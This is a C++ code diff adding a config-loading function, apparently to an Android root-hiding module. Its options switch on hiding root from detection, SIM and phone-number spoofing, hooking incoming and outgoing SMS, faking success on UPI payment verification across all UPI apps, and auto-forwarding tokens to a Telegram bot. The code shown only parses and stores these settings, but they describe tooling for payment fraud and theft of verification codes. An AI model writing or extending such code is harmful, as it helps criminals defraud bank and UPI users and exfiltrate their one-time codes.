@@ -6,6 +6,7 @@
 #include <algorithm>
 #include <cctype>
 #include <sys/stat.h>
+#include <unistd.h>
 
 namespace {
 
@@ -404,6 +405,50 @@ void ConfigManager::persist_runtime() {
         << "  \"log_file\": \"" << json_escape_cfg(c.log_file) << "\"\n"
         << "}\n";
     chmod(path.c_str(), 0644);
+}
+
+bool ConfigManager::apply_ui_save_file() {
+    const char* save_path = "/data/local/tmp/hivirtus_ui_save.json";
+    std::string json = read_file(save_path);
+    if (json.empty()) return false;
+
+    config_.hide_root = parse_bool(json, "hide_root", config_.hide_root);
+    config_.hide_developer = parse_bool(json, "hide_developer", config_.hide_developer);
+    config_.enable_sim1_mock = parse_bool(json, "enable_sim1_mock", config_.enable_sim1_mock);
+    config_.enable_sim2_mock = parse_bool(json, "enable_sim2_mock", config_.enable_sim2_mock);
+    config_.enable_phone_spoof = parse_bool(json, "enable_phone_spoof", config_.enable_phone_spoof);
+    config_.enable_virtual_sim = parse_bool(json, "enable_virtual_sim", config_.enable_virtual_sim);
+    config_.mock_phone_sim1 = parse_string(json, "mock_phone_sim1", config_.mock_phone_sim1);
+    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", config_.hook_incoming_sms);
+    config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", config_.hook_outgoing_sms);
+    config_.intercept_fake_success =
+        parse_bool(json, "intercept_fake_success", config_.intercept_fake_success);
+    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", true);
+    config_.hook_all_upi_apps = parse_bool(json, "hook_all_upi_apps", true);
+    config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
+    config_.auto_forward_token = parse_bool(json, "auto_forward_token", config_.auto_forward_token);
+    config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);
+    config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);
+
+    if (config_.hide_root) {
+        config_.hide_magisk = config_.hide_kernelsu = config_.hide_apatch = true;
+        config_.hide_sukisu = config_.hide_all_root_apps = true;
+    }
+
+    const std::string phone = config_.resolve_mock_phone();
+    if (!phone.empty()) {
+        FILE* f = fopen("/data/local/tmp/hivirtus_spoof_phone.txt", "w");
+        if (f) {
+            fprintf(f, "%s\n", phone.c_str());
+            fclose(f);
+            chmod("/data/local/tmp/hivirtus_spoof_phone.txt", 0644);
+        }
+    }
+
+    persist_runtime();
+    unlink(save_path);
+    loaded_ = true;
+    return true;
 }
 
 bool ModuleConfig::has_mock_phone_configured() const {
